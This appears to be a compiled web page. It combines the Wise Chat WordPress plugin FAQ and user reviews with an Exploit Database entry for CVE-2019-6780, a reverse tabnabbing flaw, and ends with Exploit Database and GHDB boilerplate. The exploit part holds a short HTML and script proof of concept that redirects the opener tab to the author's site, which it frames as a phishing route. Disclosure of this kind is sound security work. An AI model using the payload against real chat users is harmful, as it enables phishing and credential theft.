## FAQ

### How to create a channel and open it?

Place the following short code in your page or post:

[wise-chat channel=”My Chat Room”]

or add this PHP snippet in a template file:

or put “Wise Chat Window” widget on the desired sidebar and set the desired channel name in Channel field.

The channel will be created during the first usage and it will be added to the list of channels on Wise Chat Settings page in the Channels tab.

### I see “Loading the chat …” and the chat does not show up. What is wrong?

It means that the chat cannot start due to some errors. First, please try to check JS Console (in Chrome of Firefox) in search for any error message. Then please try to fix them. If an error comes from Wise Chat then please [let us know it](https://kainex.pl/contact/). We will do our best to help you.

Otherwise please contact the support of other plugins / themes that you suspect are causing issues. After fixing all errors in the JS Console the chat should start properly.

If you do not see any errors in the console then please try to disable any security plugin you use. They may be blocking the connection between the chat and your server.

After finding a plugin that is blocking the chat try to add an exception to it. Basically, security plugins should avoid this particular URL:

https://yourdomain/wp-content/plugins/wise-chat/src/endpoints

You may also [read this doc](https://kainex.pl/projects/wp-plugins/wise-chat-pro/documentation/troubleshooting/messages-not-being-posted/).

### I have iThemes Security plugin and Wise Chat does not work. How to fix it?

**Short answer:** WP Dashboard > Security > Settings > Advanced > System Tweaks and uncheck “Disable PHP in Plugins”. Then click Save button.

**Advanced answer:** Edit .htaccess file and locate “#Disable PHP in Plugins – Security > Settings > System Tweaks > PHP in Plugins” line. Then add a line of code:

**RewriteCond %{REQUEST\_URI} !/wp-content/plugins/wise-chat/.\*$ [NC]**

RewriteRule ^wp-content/plugins/.\*.(?:php[1-7]?|pht|phtml?|phps).?$ – [NC,F,L]

**Less recommended approach:** WP Dashboard -> Settings -> Wise Chat Settings -> AJAX Engine and set to Default. This solution is less efficient.

**Explanation:** Wise Chat executes PHP files directly in /wp-content/plugins/wise-chat/src/endpoints/ultra directory. It is done strictly for performance because the standard admin-ajax.php endpoint is too slow.

### How to give access to Wise Chat Settings page to other user roles?

Please add ‘manage\_wise\_chat\_option’ capability to any user role you wish to grant access to Wise Chat Settings page to.

By default only administrators have access to this page.

### My messages are not visible until I refresh the page. What is going on?

In order to get new messages the chat is requesting the following URL:

https://yourdomain/wp-content/plugins/wise-chat/src/endpoints

It is very likely the URL is is forbidden in your setup (403 error). It may be caused by a security plugin or theme. A specific configuration of HTTP server (.htaccess file or server settings) may be the reason too. Please ask your server administrator to make the URL accessible.

You may also [read this doc](https://kainex.pl/projects/wp-plugins/wise-chat-pro/documentation/troubleshooting/messages-not-being-posted/).

### How to create a password-protected private channel?

First, create a regular channel (see the previous question) and then go to Settings -> Wise Chat Settings page, select Channels tab. In the right to the chosen channel click “Password” link and a form will appear below. Specify the password and confirm it by clicking “Set Password” button. From now the channel is secured and only users that enter valid password are allowed to join.

### How to convert a password-protected channel into an open channel?

Go to Settings -> Wise Chat Settings page, select Channels tab. In the right to the chosen channel click “Password” link and a form will appear below. Click “Delete Password” button.

### How to install the chat using a widget?

Go to Appearance -> Widgets page, drag and drop “Wise Chat Window” widget on the desired sidebar. The name of the channel can be specified as well.

### I can’t see translation for my language. How to localize the chat for end-user?

You can do it by yourself. Go to Settings -> Wise Chat Settings page, select Localization tab and translate texts in each field into your own language. These are all texts that are exposed to end-users.

### What about the support for mobile devices and responsiveness?

Wise Chat plugin works on any mobile device that supports Javascript and cookies. The interface is responsive, but you should enable submit button in order an user could send a message. Go to Settings -> Wise Chat Settings page, select Appearance tab and select checkbox “Show Submit Button”.

### The chat generates anonymous names for every new user. How to force every user to choose their name on first use?

You can enable a form that appears every time a new user tries to enter the chat. The form displays username field and allows to enter the chat only if the user type his/her name. Settings -> Wise Chat Settings page, select General tab and select option “Force Username Selection”.

### How does the bad words filter work?

The plugin has its own implementation of bad words filtering mechanism. Currently it supports three languages: English, Polish and German. It is turned on by default. It detects not only simple words but also variations of words like: “H.a.c\_ki.n\_g” (assuming that “hacking” is a bad word).

### How to mute user? It prevents users from posting messages

Log in as an administrator and go to Settings -> Wise Chat Settings page, select Moderation tab. Enable “Mute Action” option next to the user role you want to add a permission to mute users to. Go to the chat page.

When you move the cursor over a message you will see mute button. This will mute the user who posted the message for 1 day.

Alternatively, you can go to Settings -> Wise Chat Settings page, select Muted Users tab. In “Mute IP” row specify: IP address, duration and finally click “Mute IP” button.

### How to get the list of muted users?

Go to Settings -> Wise Chat Settings page and select Muted Users tab.

### How to stop muting user?

Go to Settings -> Wise Chat Settings page, select Muted Users tab and then delete the desired user from the list.

### How to ban users? It prevents users from accessing the chat

Log in as an administrator and go to Settings -> Wise Chat Settings page, select Moderation tab. Enable “Ban Action” option next to the user role you want to add a permission to ban users to. Go to the chat page.

When you move the cursor over a message you will see ban button. This will ban the user who posted the message.

Alternatively, you can go to Settings -> Wise Chat Settings page and select Banned Users tab. In “Ban IP” row specify the IP address and click “Ban IP” button.

### How to get the list of banned users?

Log in as an administrator, go to Settings -> Wise Chat Settings page and select Banned Users tab.

### How to remove a banned IP address?

Log in as an administrator, go to Settings -> Wise Chat Settings page, select Banned Users tab and then delete the desired IP address from the list.

### How to get some information (e.g. IP address) about an user?

Log in as an administrator and type the command:

/whois [UserName]

where “UserName” is the chosen user’s name.

### How to prevent from accessing the chat by anonymous users?

Go to Settings -> Wise Chat Settings page, select General tab and check “Disable Anonymous Users” option. From now a visitor has to be logged in as a regular WordPress user in order to access the chat.

### How does auto-mute feature work?

There is a counter for each user. Every time an user types a bad word in a message the counter is increased. If it reaches the threshold (by default set to 3) the user is muted for 1 day (the duration is configurable).

### How to delete a single message from the channel?

Log in as an administrator. Go to Settings -> Wise Chat Settings, select Moderation tab and enable “Delete Action” option next to the user role you want to add a permission to delete messages to. Go to the chat page.

When you move the cursor over a message you will see delete button. This will delete the message.

Alternatively: add “wise\_chat\_delete\_message” capability to a role you want to have that permission. It could be either standard WordPress role or a custom role.

### How does “Enable Images” option actually work?

If you enable “Enable Images” option every link posted in the chat which points to an image will be converted into image. The image will be downloaded into Media Library and then displayed on the chat window. Those downloaded images will be removed from Media Library together with the related chat messages (either when removing all messages or a single one). If an image cannot be downloaded the regular link is displayed instead.

### Option “Enable Images” does not work. I see regular hyperlinks instead of images. What is wrong?

The option requires a few prerequisites in order to operate correctly: GD and Curl extensions must be installed, Media Library must operate correctly, posted image link must have a valid extension (jpg, jpeg, gif or png), HTTP status code of the response must be equal 200, image cannot be larger than 3MB (the default limit that can be adjusted in settings). Try to read PHP logs in case of any problems.

### What if I would like the images to be opened in a popup layer using Lightbox?

By default all images open using Lightbox 2 library but only if the library is installed within current theme or a dedicated plugin. Without Lightbox 2 each image opens in the new tab / window.

### I have installed a plugin containing Lightbox library and newly added messages are not displayed on the Lightbox layer. What is wrong?

If you installed a plugin that incorporates Lightbox library and it still doesn’t work make sure that the plugin uses original Lightbox 2 Javascript library. The chat is compatible only with the original Lightbox 2 library.

### Image uploader does not work. What is wrong?

Uploading of images is supported in the following Web browsers: IE 10+, Firefox 31+, Chrome 31+, Safari 7+, Opera 27+, iOS Safari 7.1+, Android Browser 4.1+, Chrome For Android 41+.

### How to replace specific phrase in every message posted by users?

You can use filters feature. Go to Settings -> Wise Chat Settings, select Filters tab and add new filter. From now each occurrence of the phrase will be replaced by the defined text in every message that is posted to any chat channel.

### Wise Chat plugin is making a lot of HTTP requests. How to improve the performance?

Every few seconds the plugin checks for new messages using AJAX requests. Please check [this article](https://kainex.pl/projects/wp-plugins/wise-chat-pro/documentation/troubleshooting/performance/) for details.

### How to customize CSS styles using “Custom CSS Styles” setting?

All CSS classes related to the chat begins with “wc” prefix. Go to Settings -> Wise Chat Settings, select Appearance tab, go to Advanced Customization section. Use “Custom CSS Styles” field to specifiy your own definitions of Wise Chat CSS classes. Valid CSS syntax is required.

### How to backup messages posted in a channel? I would like to save all messages for offline reading.

Go to Settings -> Wise Chat Settings, select Channels tab and click “Backup” link next to the desired channel. All messages from the selected channel will be downloaded as a CSV file. You can open it using MS Excel, OpenOffice or any other editor that supports CSV format.

### Are old messages being deleted from the chat window?

By default – no, however, you can enable auto-cleaning messages feature. Go to Settings -> Wise Chat Settings, select Channels tab. In the field “Auto-remove Messages” type number of minutes. Messages older than given amount of minutes will be auto-deleted.

### How to limit the amount of users that are allowed to enter a channel?

Go to Settings -> Wise Chat Settings, select Channels tab. In the field “Users Limit” type number of users that allow to participate in a channel.

### How to reset username prefix (a number that is added to anonymous users name) anonymous users?

Go to Settings -> Wise Chat Settings, select Advanced tab and click “Reset Username Prefix” button.

### When I upload an animated GIF the thumbnail is not animated. What is wrong?

WordPress has no support for resizing animated GIFs.

### Why I can change the background color of the chat window, but I cannot change the background color of the input field, buttons or borders?

It is impossible to provide options to customize every aspect of user interface. Please use CSS styles to adjust styles to your needs.

### I have uploaded a picture with incorrect orientation and the plugin did not corrected it. What is wrong?

Plugin detects EXIF data in images. If an image doesn’t have this data then nothing will happen. If EXIF data indicates that the orientation is correct then also nothing will happen.

### I am experiencing errors like “Fatal error: Call to undefined function openssl\_pkey\_get\_public() (…)”. What is wrong?

Make sure that openssl extension for your PHP installation is loaded and works correctly. In most cases these errors are caused by missing openssl module.

### How to send messages using just keyboard in multiline mode?

After you type a message use the key combination: Shift + ENTER

Hi Wise-Chat,
I am so glad I bought this wise-chat pro and it works beautifully on my site. It has many great features than the free version. It has flood control. I can set hourly/Daily etc to cleared messages. Love the voice message, it gives the members extra to play with to have them to stay in the chatroom much longer. The facebook chat style work like a charm btw!!! Just too many to list…. Not only this is a superb chat plugin. Even tho I past my 6 months supports. I contacted the developer Marcin for few advise and surely got an email support within 24 hours! You Rock Wise-Chat!!!
Thank you so very much for you wonderful chat 🙂
P.S. I am very interesting on the version 3.5.5 Video Call feature!
Please keep up the good work! Rock N Roll!!!

It’s a good plugin but I’m missing something important. An option to only allow pictures and files in group chats.
I hope it comes!
regards ak14985

Something has been done to the chat this summer and it became much worse. It simply stopped working. It seemed to be a really great product. I was going to buy the Pro version but now I have to delete it completely.

# Exploit Title: Wordpress Plugin Wisechat <= 2.6.3 - Reverse Tabnabbing
# Date: 01-22-2019
# Exploit Author: MTK (http://mtk911.cf/)
# Vendor Homepage: https://kaine.pl/
# Softwae Link: https://wordpress.org/plugins/wise-chat/
# Version: Up to V2.6.3
# Tested on: Debian 9 - Apache2 - Wordpress 4.9.8 - Firefox
# CVE : 2019-6780.

# Plugin description:
Wise Chat is a leading chat plugin that helps to build a social network and to increase user engagement on your website by providing the possibility to exchange real time messages in chat rooms. The plugin is easily installable and extremely configurable. Its features list is growing all the time.

# POC
Send following URL on wise chat "http://mtk911.cf/OR/" which has the following html

<html>
<script>
if (window.opener) window.opener.parent.location.replace('http://mtk911.cf/');
if (window.parent != window) window.parent.location.replace('http://mtk911.cf/');
</script>
Open Redirect TEST
</html>

when you click on that user. This opens in a new tab, and the parent tab is silently redirected to my website without asking the user.

#Technical Details & Impact:
In a real life example, this would redirect to a phishing site to try gain credentials for users.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## What cybersecurity professionals are saying

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)
### Emile Kok

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)
